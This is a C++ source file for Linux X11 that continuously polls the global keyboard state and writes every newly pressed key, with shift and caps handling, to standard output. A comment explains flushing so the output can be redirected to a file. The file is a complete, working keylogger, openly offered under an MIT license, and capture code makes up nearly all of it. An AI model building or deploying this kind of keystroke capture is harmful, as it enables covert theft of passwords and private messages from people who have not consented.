/*
  
MIT License

Copyright (c) 2024 Androsh7 and AndrewBarthUSMC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

*/

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <iostream>
#include <unordered_map>

#define charlistlen 47
std::unordered_map<char, char> charkeylist {
        {'0',')'},
        {'1','!'},
        {'2','@'},
        {'3','#'},
        {'4','$'},
        {'5','%'},
        {'6','^'},
        {'7','&'},
        {'8','*'},
        {'9','('},
        {'a','A'},
        {'b','B'},
        {'c','C'},
        {'d','D'},
        {'e','E'},
        {'f','F'},
        {'g','G'},
        {'h','H'},
        {'i','I'},
        {'j','J'},
        {'k','K'},
        {'l','L'},
        {'m','M'},
        {'n','N'},
        {'o','O'},
        {'p','P'},
        {'q','Q'},
        {'r','R'},
        {'s','S'},
        {'t','T'},
        {'u','U'},
        {'v','V'},
        {'w','W'},
        {'x','X'},
        {'y','Y'},
        {'z','Z'},
        {';',','},
        {'=','+'},
        {',','<'},
        {'-','_'},
        {'.','>'},
        {'/','?'},
        {'`','~'},
        {'[','{'},
        {'\\','|'},
        {']','}'},
        {'\'','"'},
};

char caps_char(char find_char) {
        if (charkeylist.find(find_char) != charkeylist.end())
                return charkeylist[find_char];
        return '\0';
}

int get_key_state(char* keys, char* prev_keys, int key_num) {
        int byteIndex = key_num / 8;
        int bitIndex = key_num % 8;
        bool current_state = keys[byteIndex] & (1 << bitIndex);
        bool prev_state = prev_keys[byteIndex] & (1 << bitIndex);
        if (current_state && !prev_state) return 1; // key pressed
        if (current_state && prev_state) return 2; // key held
        if (!current_state && prev_state) return 3; // key released
        return 0; // key not pressed
}

int main() {
        Display *display = XOpenDisplay(NULL);
        if (display == NULL) {
                fprintf(stderr, "Unable to open display\n");
                return 1;
        }

        char raw_keys[32];
        char prev_raw_keys[32];

        int min_keycode, max_keycode, keysyms;

        bool shift = false;
        bool caps = false;

        // Gets mapping of keycodes
        XDisplayKeycodes(display, &min_keycode, &max_keycode);
        KeySym *mapping = XGetKeyboardMapping(display, min_keycode, max_keycode - min_keycode + 1, &keysyms);

        while (True)
        {
                // read key states
                XQueryKeymap(display, raw_keys);

                // check L_shift status
                if (get_key_state(raw_keys, prev_raw_keys, 50) == 1) {
                        shift = true;
                } else if (shift && get_key_state(raw_keys, prev_raw_keys, 50) == 3) {
                        shift = false;
                }
                // check R_shift status
                if (get_key_state(raw_keys, prev_raw_keys, 62) == 1) {
                        shift = true;
                } else if (shift && get_key_state(raw_keys, prev_raw_keys, 62) == 3) {
                        shift = false;
                }
                // check caps status
                if (get_key_state(raw_keys, prev_raw_keys, 66) == 1) {
                        caps = !caps;
                }
                bool capitalization = caps ^ shift; // capitalization

                
                // writes key states to keymap
                for (int i = 0; i < 256; i++) {
                        int byteIndex = i / 8;
                        int bitIndex = i % 8;

                        // skip checking L_shift(50), R_shift(62), and caps lock(66)
                        //if (i == 66 || i == 50 || i == 62) { continue; }
                        
                        // Key press
                        if (raw_keys[byteIndex] & (1 << bitIndex) && !(prev_raw_keys[byteIndex] & (1 << bitIndex))) {

                                for (int j = 0; j < keysyms; j++) {
                                        KeySym keypress = mapping[(i - min_keycode) * keysyms + j];

                                        if (keypress != NoSymbol) {

                                                std::string key = XKeysymToString(keypress);

                                                // convert phrases to single char
                                                if (key == "grave") { key = "`";}
                                                else if (key == "minus") { key = "-";}
                                                else if (key == "equal") { key = "=";}
                                                else if (key == "bracketleft") { key = "[";}
                                                else if (key == "bracketright") { key = "]";}
                                                else if (key == "backslash") { key = "\\";}
                                                else if (key == "semicolon") { key = ";";}
                                                else if (key == "apostrophe") { key = "'";}
                                                else if (key == "comma") { key = ",";}
                                                else if (key == "period") { key = ".";}
                                                else if (key == "slash") { key = "/";}

                                                // gets capitalized chars
                                                if (key.length() == 1 && capitalization) {
                                                        char temp_char = caps_char(key.at(0));
                                                        key = "";
                                                        key += temp_char;
                                                        key += '\0';
                                                } else if (key.length() > 1) {
                                                        if (key == "space") { key = " "; }
                                                        else if (key == "BackSpace") { key = "\b"; } // prints backspace characters (use hexdump to view raw output or replace \b with another character)
                                                        else if (key == "Tab") { key = "\t"; }
                                                        else if (key == "Return") { key = "\n"; }
                                                }
                                                std::cout << key;
                                                                                                
                                                // Important to flush to write in a file
                                                // Can alternatively disable buffering in stdout
                                                fflush(stdout);
                                                break;
                                        }
                                }
                        }
                }
                for (int i = 0; i < 32; i++) {
                        prev_raw_keys[i] = raw_keys[i];
                        raw_keys[i] = '\0';
                }

        }
        XFree(mapping);
        XCloseDisplay(display);
        return 0;
}
